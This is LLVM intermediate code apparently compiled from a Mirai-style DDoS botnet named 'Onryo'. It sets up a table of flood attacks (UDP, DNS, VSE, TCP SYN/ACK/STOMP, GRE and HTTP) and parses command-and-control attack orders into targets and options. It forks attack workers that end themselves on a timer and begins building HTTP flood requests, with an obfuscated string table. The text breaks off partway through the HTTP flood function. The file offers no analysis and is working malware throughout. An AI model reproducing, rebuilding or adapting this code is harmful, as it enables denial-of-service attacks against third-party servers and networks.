; ModuleID = 'host/ir_O2/Onryo.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@methods_len = local_unnamed_addr global i8 0, align 1
@methods = local_unnamed_addr global %struct.attack_method** null, align 8
@attack_ongoing = local_unnamed_addr global [3 x i32] zeroinitializer, align 4
@LOCAL_ADDR = common local_unnamed_addr global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@table = common local_unnamed_addr global [81 x %struct.table_value] zeroinitializer, align 16
@table_key = local_unnamed_addr global i32 -559038737, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() local_unnamed_addr #0 {
  tail call fastcc void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_generic)
  tail call fastcc void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_vse)
  tail call fastcc void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_dns)
  tail call fastcc void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_plain)
  tail call fastcc void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_tcp_syn)
  tail call fastcc void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_tcp_ack)
  tail call fastcc void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_tcp_stomp)
  tail call fastcc void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_gre_ip)
  tail call fastcc void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_gre_eth)
  tail call fastcc void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_app_http)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) unnamed_addr #0 {
  %3 = tail call noalias i8* @calloc(i64 1, i64 16) #9
  %4 = getelementptr inbounds i8, i8* %3, i64 8
  store i8 %0, i8* %4, align 8
  %5 = bitcast i8* %3 to void (i8, %struct.attack_target*, i8, %struct.attack_option*)**
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %5, align 8
  %6 = load i8*, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %7 = load i8, i8* @methods_len, align 1
  %8 = zext i8 %7 to i64
  %9 = shl nuw nsw i64 %8, 3
  %10 = add nuw nsw i64 %9, 8
  %11 = tail call i8* @realloc(i8* %6, i64 %10) #9
  %12 = bitcast i8* %11 to %struct.attack_method**
  store i8* %11, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %13 = load i8, i8* @methods_len, align 1
  %14 = add i8 %13, 1
  store i8 %14, i8* @methods_len, align 1
  %15 = zext i8 %13 to i64
  %16 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %12, i64 %15
  %17 = bitcast %struct.attack_method** %16 to i8**
  store i8* %3, i8** %17, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #1

; Function Attrs: nounwind
declare noalias i8* @realloc(i8* nocapture, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() local_unnamed_addr #0 {
  %1 = load i32, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 0), align 4
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %0
  %4 = tail call i32 @kill(i32 %1, i32 9) #9
  br label %5

; <label>:5:                                      ; preds = %0, %3
  store i32 0, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 0), align 4
  %6 = load i32, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 1), align 4
  %7 = icmp eq i32 %6, 0
  br i1 %7, label %10, label %8

; <label>:8:                                      ; preds = %5
  %9 = tail call i32 @kill(i32 %6, i32 9) #9
  br label %10

; <label>:10:                                     ; preds = %8, %5
  store i32 0, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 1), align 4
  %11 = load i32, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 2), align 4
  %12 = icmp eq i32 %11, 0
  br i1 %12, label %15, label %13

; <label>:13:                                     ; preds = %10
  %14 = tail call i32 @kill(i32 %11, i32 9) #9
  br label %15

; <label>:15:                                     ; preds = %13, %10
  store i32 0, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 2), align 4
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) local_unnamed_addr #0 {
  %3 = icmp ult i32 %1, 4
  br i1 %3, label %.thread80, label %4

; <label>:4:                                      ; preds = %2
  %5 = bitcast i8* %0 to i32*
  %6 = load i32, i32* %5, align 4
  %7 = tail call i32 @ntohl(i32 %6) #10
  %8 = icmp eq i32 %1, 4
  br i1 %8, label %.thread80, label %9

; <label>:9:                                      ; preds = %4
  %10 = getelementptr inbounds i8, i8* %0, i64 4
  %11 = load i8, i8* %10, align 1
  %12 = icmp eq i32 %1, 5
  br i1 %12, label %.thread80, label %13

; <label>:13:                                     ; preds = %9
  %14 = getelementptr inbounds i8, i8* %0, i64 5
  %15 = getelementptr inbounds i8, i8* %0, i64 6
  %16 = load i8, i8* %14, align 1
  %17 = add i32 %1, -6
  %18 = zext i8 %16 to i32
  %19 = icmp eq i8 %16, 0
  br i1 %19, label %.thread80, label %20

; <label>:20:                                     ; preds = %13
  %21 = sext i32 %17 to i64
  %22 = zext i8 %16 to i64
  %23 = mul nuw nsw i64 %22, 5
  %24 = icmp ult i64 %21, %23
  br i1 %24, label %.thread80, label %.lr.ph88.preheader

.lr.ph88.preheader:                               ; preds = %20
  %25 = tail call noalias i8* @calloc(i64 %22, i64 24) #9
  %26 = bitcast i8* %25 to %struct.attack_target*
  %27 = add nsw i32 %18, -1
  %28 = zext i32 %27 to i64
  %29 = mul nuw nsw i64 %28, 5
  %30 = add nuw nsw i64 %29, 11
  %scevgep = getelementptr i8, i8* %0, i64 %30
  %wide.trip.count = zext i8 %16 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph88.prol.loopexit, label %.lr.ph88.prol.preheader

.lr.ph88.prol.preheader:                          ; preds = %.lr.ph88.preheader
  br label %.lr.ph88.prol

.lr.ph88.prol:                                    ; preds = %.lr.ph88.prol.preheader
  %31 = bitcast i8* %15 to i32*
  %32 = load i32, i32* %31, align 4
  %33 = getelementptr inbounds i8, i8* %25, i64 16
  %34 = bitcast i8* %33 to i32*
  store i32 %32, i32* %34, align 4
  %35 = getelementptr inbounds i8, i8* %0, i64 10
  %36 = getelementptr inbounds i8, i8* %0, i64 11
  %37 = load i8, i8* %35, align 1
  %38 = getelementptr inbounds i8, i8* %25, i64 20
  store i8 %37, i8* %38, align 4
  %39 = bitcast i8* %25 to i16*
  store i16 2, i16* %39, align 4
  %40 = getelementptr inbounds i8, i8* %25, i64 4
  %41 = bitcast i8* %40 to i32*
  store i32 %32, i32* %41, align 4
  br label %.lr.ph88.prol.loopexit

.lr.ph88.prol.loopexit:                           ; preds = %.lr.ph88.preheader, %.lr.ph88.prol
  %indvars.iv91.unr = phi i64 [ 0, %.lr.ph88.preheader ], [ 1, %.lr.ph88.prol ]
  %.087.unr = phi i8* [ %15, %.lr.ph88.preheader ], [ %36, %.lr.ph88.prol ]
  %42 = icmp eq i8 %16, 1
  br i1 %42, label %._crit_edge, label %.lr.ph88.preheader.new

.lr.ph88.preheader.new:                           ; preds = %.lr.ph88.prol.loopexit
  br label %.lr.ph88

.lr.ph88:                                         ; preds = %.lr.ph88, %.lr.ph88.preheader.new
  %indvars.iv91 = phi i64 [ %indvars.iv91.unr, %.lr.ph88.preheader.new ], [ %indvars.iv.next92.1, %.lr.ph88 ]
  %.087 = phi i8* [ %.087.unr, %.lr.ph88.preheader.new ], [ %56, %.lr.ph88 ]
  %43 = bitcast i8* %.087 to i32*
  %44 = load i32, i32* %43, align 4
  %45 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 1
  store i32 %44, i32* %45, align 4
  %46 = getelementptr inbounds i8, i8* %.087, i64 4
  %47 = getelementptr inbounds i8, i8* %.087, i64 5
  %48 = load i8, i8* %46, align 1
  %49 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 2
  store i8 %48, i8* %49, align 4
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 0
  store i16 2, i16* %50, align 4
  %51 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 2, i32 0
  store i32 %44, i32* %51, align 4
  %indvars.iv.next92 = add nuw nsw i64 %indvars.iv91, 1
  %52 = bitcast i8* %47 to i32*
  %53 = load i32, i32* %52, align 4
  %54 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 1
  store i32 %53, i32* %54, align 4
  %55 = getelementptr inbounds i8, i8* %.087, i64 9
  %56 = getelementptr inbounds i8, i8* %.087, i64 10
  %57 = load i8, i8* %55, align 1
  %58 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 2
  store i8 %57, i8* %58, align 4
  %59 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 0
  store i16 2, i16* %59, align 4
  %60 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 2, i32 0
  store i32 %53, i32* %60, align 4
  %indvars.iv.next92.1 = add nsw i64 %indvars.iv91, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next92.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge.unr-lcssa, label %.lr.ph88

._crit_edge.unr-lcssa:                            ; preds = %.lr.ph88
  br label %._crit_edge

._crit_edge:                                      ; preds = %.lr.ph88.prol.loopexit, %._crit_edge.unr-lcssa
  %61 = mul nsw i32 %18, -5
  %62 = add i32 %17, %61
  %63 = icmp eq i32 %62, 0
  br i1 %63, label %.loopexit81.thread, label %64

; <label>:64:                                     ; preds = %._crit_edge
  %65 = load i8, i8* %scevgep, align 1
  %66 = icmp eq i8 %65, 0
  br i1 %66, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %64
  %67 = zext i8 %65 to i64
  %68 = tail call noalias i8* @calloc(i64 %67, i64 16) #9
  %69 = bitcast i8* %68 to %struct.attack_option*
  %70 = getelementptr inbounds i8, i8* %scevgep, i64 1
  %71 = add i32 %62, -1
  %72 = zext i8 %65 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %85
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %85 ]
  %.184 = phi i8* [ %70, %.lr.ph.preheader ], [ %91, %85 ]
  %.17583 = phi i32 [ %71, %.lr.ph.preheader ], [ %92, %85 ]
  %73 = icmp eq i32 %.17583, 0
  br i1 %73, label %.loopexit81.loopexit, label %74

; <label>:74:                                     ; preds = %.lr.ph
  %75 = load i8, i8* %.184, align 1
  %76 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %69, i64 %indvars.iv, i32 1
  store i8 %75, i8* %76, align 8
  %77 = icmp eq i32 %.17583, 1
  br i1 %77, label %.loopexit81.loopexit, label %78

; <label>:78:                                     ; preds = %74
  %79 = getelementptr inbounds i8, i8* %.184, i64 1
  %80 = getelementptr inbounds i8, i8* %.184, i64 2
  %81 = load i8, i8* %79, align 1
  %82 = add i32 %.17583, -2
  %83 = zext i8 %81 to i32
  %84 = icmp slt i32 %82, %83
  br i1 %84, label %.loopexit81.loopexit, label %85

; <label>:85:                                     ; preds = %78
  %86 = add nuw nsw i32 %83, 1
  %87 = zext i32 %86 to i64
  %88 = tail call noalias i8* @calloc(i64 %87, i64 1) #9
  %89 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %69, i64 %indvars.iv, i32 0
  store i8* %88, i8** %89, align 8
  tail call void @util_memcpy(i8* %88, i8* %80, i32 %83) #9
  %90 = zext i8 %81 to i64
  %91 = getelementptr inbounds i8, i8* %80, i64 %90
  %92 = sub nsw i32 %82, %83
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %93 = icmp slt i64 %indvars.iv.next, %72
  br i1 %93, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %85
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %64
  %.070 = phi %struct.attack_option* [ null, %64 ], [ %69, %.loopexit.loopexit ]
  %94 = tail call i32* @__errno_location() #10
  store i32 0, i32* %94, align 4
  tail call void @attack_start(i32 %7, i8 zeroext %11, i8 zeroext %16, %struct.attack_target* %26, i8 zeroext %65, %struct.attack_option* %.070)
  br label %.loopexit81

.loopexit81.loopexit:                             ; preds = %.lr.ph, %74, %78
  br label %.loopexit81

.loopexit81:                                      ; preds = %.loopexit81.loopexit, %.loopexit
  %.171 = phi %struct.attack_option* [ %.070, %.loopexit ], [ %69, %.loopexit81.loopexit ]
  %95 = icmp eq i8* %25, null
  br i1 %95, label %96, label %.loopexit81.thread

.loopexit81.thread:                               ; preds = %._crit_edge, %.loopexit81
  %.17195 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ null, %._crit_edge ]
  %.07393 = phi i8 [ %65, %.loopexit81 ], [ undef, %._crit_edge ]
  tail call void @free(i8* nonnull %25) #9
  br label %96

; <label>:96:                                     ; preds = %.loopexit81, %.loopexit81.thread
  %.17196 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ %.17195, %.loopexit81.thread ]
  %.07394 = phi i8 [ %65, %.loopexit81 ], [ %.07393, %.loopexit81.thread ]
  %97 = icmp eq %struct.attack_option* %.17196, null
  br i1 %97, label %.thread80, label %98

; <label>:98:                                     ; preds = %96
  %99 = zext i8 %.07394 to i32
  tail call fastcc void @free_opts(%struct.attack_option* nonnull %.17196, i32 %99)
  br label %.thread80

.thread80:                                        ; preds = %2, %4, %9, %13, %20, %96, %98
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #2

declare void @util_memcpy(i8*, i8*, i32) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) local_unnamed_addr #0 {
  %7 = tail call i32 @fork() #9
  %8 = icmp eq i32 %7, -1
  %9 = icmp sgt i32 %7, 0
  %or.cond = or i1 %8, %9
  br i1 %or.cond, label %10, label %11

; <label>:10:                                     ; preds = %6
  ret void

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @fork() #9
  switch i32 %12, label %.preheader [
    i32 -1, label %17
    i32 0, label %18
  ]

.preheader:                                       ; preds = %11
  %13 = load i8, i8* @methods_len, align 1
  %14 = icmp eq i8 %13, 0
  br i1 %14, label %.loopexit, label %.lr.ph

.lr.ph:                                           ; preds = %.preheader
  %15 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %16 = zext i8 %13 to i64
  br label %24

; <label>:17:                                     ; preds = %11
  tail call void @exit(i32 0) #11
  unreachable

; <label>:18:                                     ; preds = %11
  %19 = tail call i32 @sleep(i32 %0) #9
  %20 = tail call i32 @getppid() #9
  %21 = tail call i32 @kill(i32 %20, i32 9) #9
  tail call void @exit(i32 0) #11
  unreachable

; <label>:22:                                     ; preds = %24
  %23 = icmp slt i64 %indvars.iv.next, %16
  br i1 %23, label %24, label %.loopexit.loopexit

; <label>:24:                                     ; preds = %.lr.ph, %22
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %22 ]
  %25 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %15, i64 %indvars.iv
  %26 = load %struct.attack_method*, %struct.attack_method** %25, align 8
  %27 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %26, i64 0, i32 1
  %28 = load i8, i8* %27, align 8
  %29 = icmp eq i8 %28, %1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %29, label %30, label %22

; <label>:30:                                     ; preds = %24
  %31 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %26, i64 0, i32 0
  %32 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %31, align 8
  tail call void %32(i8 zeroext %2, %struct.attack_target* %3, i8 zeroext %4, %struct.attack_option* %5) #9
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %22
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %30
  tail call void @exit(i32 0) #11
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @free_opts(%struct.attack_option*, i32) unnamed_addr #0 {
  %3 = icmp eq %struct.attack_option* %0, null
  br i1 %3, label %11, label %.preheader

.preheader:                                       ; preds = %2
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %9
  %indvars.iv = phi i64 [ %indvars.iv.next, %9 ], [ 0, %.lr.ph.preheader ]
  %5 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %0, i64 %indvars.iv, i32 0
  %6 = load i8*, i8** %5, align 8
  %7 = icmp eq i8* %6, null
  br i1 %7, label %9, label %8

; <label>:8:                                      ; preds = %.lr.ph
  tail call void @free(i8* nonnull %6) #9
  br label %9

; <label>:9:                                      ; preds = %.lr.ph, %8
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %9
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %10 = bitcast %struct.attack_option* %0 to i8*
  tail call void @free(i8* %10) #9
  br label %11

; <label>:11:                                     ; preds = %2, %._crit_edge
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #4

declare i32 @sleep(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @getppid() local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i8* readnone) local_unnamed_addr #5 {
  %5 = icmp eq i8 %0, 0
  br i1 %5, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %4
  %6 = zext i8 %0 to i64
  br label %.lr.ph

; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp slt i64 %indvars.iv.next, %6
  br i1 %8, label %.lr.ph, label %.loopexit.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %7
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %7 ]
  %9 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 1
  %10 = load i8, i8* %9, align 8
  %11 = icmp eq i8 %10, %2
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %11, label %12, label %7

; <label>:12:                                     ; preds = %.lr.ph
  %13 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 0
  %14 = load i8*, i8** %13, align 8
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %7
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %12
  %.09 = phi i8* [ %14, %12 ], [ %3, %4 ], [ %3, %.loopexit.loopexit ]
  ret i8* %.09
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @util_atoi(i8* nonnull %5, i32 10) #9
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

declare i32 @util_atoi(i8*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @inet_addr(i8* nonnull %5) #9
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target* nocapture readonly, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca [10241 x i8], align 16
  %7 = alloca %struct.fd_set, align 8
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %9 to %struct.timeval*
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca [10240 x i8], align 16
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 21, i8* null)
  %15 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 20, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  %16 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 8, i8* null)
  %17 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 22, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 24, i32 1)
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 80)
  %20 = trunc i32 %19 to i16
  %21 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %21, i8 0, i64 10241, i32 16, i1 false)
  %22 = icmp eq i8* %16, null
  %23 = icmp eq i8* %17, null
  %or.cond = or i1 %22, %23
  br i1 %or.cond, label %1018, label %24

; <label>:24:                                     ; preds = %4
  %25 = tail call i32 @util_strlen(i8* %17) #9
  %26 = icmp sgt i32 %25, 255
  br i1 %26, label %1018, label %27

; <label>:27:                                     ; preds = %24
  %28 = tail call i32 @util_strlen(i8* %16) #9
  %29 = icmp sgt i32 %28, 127
  br i1 %29, label %1018, label %30

; <label>:30:                                     ; preds = %27
  %31 = tail call i32 @util_strlen(i8* %15) #9
  %32 = icmp sgt i32 %31, 9
  br i1 %32, label %1018, label %.preheader617

.preheader617:                                    ; preds = %30
  store i32 0, i32* %5, align 4
  %33 = tail call i32 @util_strlen(i8* %15) #9
  %34 = icmp sgt i32 %33, 0
  br i1 %34, label %.lr.ph657.preheader, label %._crit_edge658

.lr.ph657.preheader:                              ; preds = %.preheader617
  br label %.lr.ph657

.lr.ph657:                                        ; preds = %.lr.ph657.preheader, %42
  %35 = phi i32 [ %44, %42 ], [ 0, %.lr.ph657.preheader ]
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %15, i64 %36
  %38 = load i8, i8* %37, align 1
  %.off606 = add i8 %38, -97
  %39 = icmp ult i8 %.off606, 26
  br i1 %39, label %40, label %42

; <label>:40:                                     ; preds = %.lr.ph657
  %41 = add i8 %38, -32
  store i8 %41, i8* %37, align 1
  %.pre = load i32, i32* %5, align 4
  br label %42

; <label>:42:                                     ; preds = %.lr.ph657, %40
  %43 = phi i32 [ %35, %.lr.ph657 ], [ %.pre, %40 ]
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %5, align 4
  %45 = tail call i32 @util_strlen(i8* nonnull %15) #9
  %46 = icmp slt i32 %44, %45
  br i1 %46, label %.lr.ph657, label %._crit_edge658.loopexit

._crit_edge658.loopexit:                          ; preds = %42
  br label %._crit_edge658

._crit_edge658:                                   ; preds = %._crit_edge658.loopexit, %.preheader617
  %47 = icmp slt i32 %18, 500
  %. = select i1 %47, i32 %18, i32 500
  tail call void @table_unlock_val(i8 zeroext 36)
  tail call void @table_unlock_val(i8 zeroext 37)
  tail call void @table_unlock_val(i8 zeroext 38)
  tail call void @table_unlock_val(i8 zeroext 39)
  tail call void @table_unlock_val(i8 zeroext 40)
  tail call void @table_unlock_val(i8 zeroext 41)
  tail call void @table_unlock_val(i8 zeroext 42)
  tail call void @table_unlock_val(i8 zeroext 43)
  tail call void @table_unlock_val(i8 zeroext 44)
  tail call void @table_unlock_val(i8 zeroext 45)
  tail call void @table_unlock_val(i8 zeroext 46)
  %48 = sext i32 %. to i64
  %49 = tail call noalias i8* @calloc(i64 %48, i64 3140) #9
  %50 = bitcast i8* %49 to %struct.attack_http_state*
  %51 = icmp sgt i32 %18, 0
  br i1 %51, label %.lr.ph656, label %.preheader615

.lr.ph656:                                        ; preds = %._crit_edge658
  %52 = zext i8 %0 to i32
  br label %64

.preheader615.loopexit:                           ; preds = %95
  br label %.preheader615

.preheader615:                                    ; preds = %.preheader615.loopexit, %._crit_edge658
  %53 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %7, i64 0, i32 0, i64 0
  %54 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i64 0, i32 0, i64 0
  %55 = bitcast i32* %12 to i8*
  %56 = bitcast %struct.sockaddr_in* %10 to i8*
  %57 = bitcast i32* %5 to i8*
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 0
  %59 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 2, i32 0
  %60 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i64 0, i32 1
  %61 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %62 = getelementptr inbounds [10240 x i8], [10240 x i8]* %11, i64 0, i64 0
  %63 = icmp ne i8* %14, null
  %.not = icmp slt i32 %18, 1
  br label %.backedge616

